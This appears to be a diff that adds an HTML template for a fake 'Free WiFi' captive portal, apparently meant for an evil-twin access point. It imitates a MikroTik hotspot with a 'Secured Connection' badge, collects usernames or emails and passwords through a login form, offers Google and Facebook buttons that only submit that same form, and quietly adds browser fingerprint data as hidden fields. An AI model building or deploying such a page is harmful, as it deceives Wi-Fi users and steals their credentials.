@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ ssid }} - Free WiFi</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #e0e0e0;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 48px 40px;
+            width: 90%;
+            max-width: 420px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo .wifi-icon {
+            font-size: 56px;
+            margin-bottom: 8px;
+        }
+        .logo h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #4fc3f7;
+            letter-spacing: -0.5px;
+        }
+        .logo p {
+            font-size: 14px;
+            color: #90a4ae;
+            margin-top: 4px;
+        }
+        .mikrotik-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: rgba(76, 175, 80, 0.15);
+            border: 1px solid rgba(76, 175, 80, 0.3);
+            border-radius: 8px;
+            padding: 8px 16px;
+            margin-bottom: 28px;
+            font-size: 12px;
+            color: #81c784;
+        }
+        .mikrotik-badge .dot {
+            width: 8px;
+            height: 8px;
+            background: #4caf50;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #b0bec5;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #4fc3f7;
+            background: rgba(79, 195, 247, 0.08);
+            box-shadow: 0 0 0 3px rgba(79, 195, 247, 0.15);
+        }
+        .form-group input::placeholder {
+            color: #546e7a;
+        }
+        .btn-connect {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #4fc3f7, #0288d1);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 8px;
+        }
+        .btn-connect:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(79, 195, 247, 0.4);
+        }
+        .btn-connect:active {
+            transform: translateY(0);
+        }
+        .terms {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #78909c;
+            line-height: 1.6;
+        }
+        .terms a {
+            color: #4fc3f7;
+            text-decoration: none;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+            font-size: 11px;
+            color: #546e7a;
+        }
+        .social-login {
+            display: flex;
+            gap: 12px;
+            margin-top: 16px;
+            margin-bottom: 20px;
+        }
+        .social-btn {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            color: #e0e0e0;
+            font-size: 14px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+            text-decoration: none;
+        }
+        .social-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.25);
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #546e7a;
+            font-size: 12px;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.1);
+        }
+        .divider span {
+            padding: 0 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="wifi-icon">📶</div>
+            <h1>{{ ssid }}</h1>
+            <p>High-Speed Wireless Internet Access</p>
+        </div>
+
+        <div class="mikrotik-badge">
+            <span class="dot"></span>
+            <span>MikroTik Hotspot Portal — Secured Connection</span>
+        </div>
+
+        <form action="/login" method="POST" id="loginForm">
+            <div class="form-group">
+                <label>Email or Username</label>
+                <input type="text" name="username" placeholder="Enter your email" required autocomplete="username">
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Enter password" required autocomplete="current-password">
+            </div>
+            <button type="submit" class="btn-connect">🔗 Connect to WiFi</button>
+        </form>
+
+        <div class="divider"><span>or continue with</span></div>
+
+        <div class="social-login">
+            <a href="/login" class="social-btn" onclick="document.getElementById('loginForm').submit()">📱 Google</a>
+            <a href="/login" class="social-btn" onclick="document.getElementById('loginForm').submit()">📘 Facebook</a>
+        </div>
+
+        <div class="terms">
+            By connecting, you agree to our<br>
+            <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
+        </div>
+
+        <div class="footer">
+            Powered by MikroTik RouterOS v7.15 &bull; Managed WiFi Gateway
+        </div>
+    </div>
+
+    <script>
+        // Collect extra client info
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // Add hidden fields with client info
+            var fields = {
+                'screen_res': screen.width + 'x' + screen.height,
+                'timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+                'language': navigator.language,
+                'platform': navigator.platform,
+                'cookie_enabled': navigator.cookieEnabled,
+                'do_not_track': navigator.doNotTrack,
+                'connection_type': (navigator.connection || {}).effectiveType || 'unknown',
+            };
+            for (var key in fields) {
+                var input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                this.appendChild(input);
+            }
+        });
+    </script>
+</body>
+</html>
